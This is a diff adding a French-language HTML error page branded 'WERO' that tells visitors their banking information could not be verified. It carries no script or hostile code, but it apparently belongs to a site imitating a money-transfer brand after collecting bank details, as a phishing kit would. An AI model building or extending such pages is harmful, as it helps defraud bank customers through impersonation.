@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Erreur de Transaction</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        .content {
+            margin-top: 100px;
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .error-icon {
+            font-size: 64px;
+            color: #dc3545;
+            margin: 20px 0;
+        }
+
+        .error-message {
+            font-size: 18px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="logo">WERO</span>
+    </div>
+
+    <div class="content">
+        <div class="card p-4">
+            <i class="fas fa-exclamation-circle error-icon"></i>
+            <h2 class="text-center mb-4">Erreur de Transaction</h2>
+            
+            <div class="error-message">
+                <p>Nous sommes désolés, mais une erreur est survenue lors de la vérification de vos informations bancaires.</p>
+                <p>Veuillez vérifier vos informations et réessayer plus tard.</p>
+            </div>
+
+            <button onclick="window.location.href='index.html'" class="btn btn-custom mt-4">
+                Retour à l'accueil
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container text-center">
+            <span class="logo-white">WERO</span>
+            <p>Simplifiez vos transferts d'argent en Europe.</p>
+            <div class="social-icons">
+                <a href="#"><i class="fab fa-facebook"></i></a>
+                <a href="#"><i class="fab fa-instagram"></i></a>
+                <a href="#"><i class="fab fa-tiktok"></i></a>
+                <a href="#"><i class="fab fa-twitter"></i></a>
+            </div>
+            <p class="security">SÉCURITÉ</p>
+            <p>contact@wero.com</p>
+            <p class="copyright">© 2024. All rights reserved.</p>
+        </div>
+    </footer>
+</body>
+</html>
